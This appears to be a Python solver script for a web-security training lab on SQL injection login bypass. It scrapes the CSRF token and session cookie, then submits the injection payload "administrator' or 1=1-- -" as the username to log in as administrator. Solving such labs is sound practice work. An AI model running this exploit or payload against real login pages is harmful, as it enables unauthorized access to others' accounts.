#####################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 13/9/2023
#
# Lab: SQL injection vulnerability allowing login bypass
#
# Steps: 1. Fetch the login page
#        2. Extract the csrf token and session cookie
#        3. Inject the payload and bypass password check
#        4. Login in as administrator
#
#####################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0aaf00fe0376a04881338bbe007700b1.web-security-academy.net"

try:  
    # fetch the login page
    fetch_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1)

# if response is OK
if fetch_login.status_code == 200:
    print(Fore.WHITE + "1. Fetching login page.. " + Fore.GREEN + "OK")
    
    # get session cookie
    session = fetch_login.cookies.get("session")
    
    # Extract the csrf token
    csrf = re.findall("csrf.+value=\"(.+)\"", fetch_login.text)[0]
    
    print(Fore.WHITE + "2. Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")
    
    # payload to login as administrator
    payload = "administrator' or 1=1-- -"
    
    # data to send via POST
    data = {
        "username": payload,
        "password": "not important",
        "csrf": csrf
    }

    # set session cookie
    cookies = {
        "session": session
    }
    
    try:
        # login in with the injected payload
        login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
        
    except:
        print(Fore.RED + "[!] Failed to inject the payload through exception")
        exit(1)

    # if login is successful, a redirect will occurred
    if login.status_code == 302:
        print(Fore.WHITE + "3. Injecting payload and bypassing password check.. " + Fore.GREEN + "OK")
        
        # get session cookie
        new_session = login.cookies.get("session")
        
        # set session cookie
        cookies = {
            "session": new_session
        }

        try:  
            # fetch admin home page
            admin = requests.get(f"{url}/my-account", cookies=cookies)
        
        except:
            print(Fore.RED + "[!] Failed to fetch admin home through exception")
            exit(1)

        # if response is OK
        if admin.status_code == 200:
            print(Fore.WHITE + "4. Logging in as administrator.. " + Fore.GREEN + "OK")
            print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")
        
        else:
            print(Fore.RED + "[!] Failed to fetch admin home")

    else:
        print(Fore.RED + "[!] Failed to inject the payload")    
   
else:
    print(Fore.RED + "[!] Failed to fetch the login page")

